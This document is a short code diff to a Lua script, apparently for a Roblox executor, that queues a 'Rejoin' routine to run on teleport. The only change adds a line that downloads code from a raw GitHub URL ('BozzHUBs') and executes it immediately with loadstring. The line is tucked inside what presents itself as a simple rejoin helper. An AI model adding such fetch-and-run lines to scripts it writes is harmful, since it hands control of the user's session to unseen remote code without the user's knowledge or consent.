@@ -30,6 +30,7 @@ Rejoid = function()
 
 local script_to_run = [[
     print("Rejoin")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/krrphirmyprathumsri02-gif/BozzHUBs/refs/heads/main/654982545"))()
 ]]
 
 if queue_on_teleport then
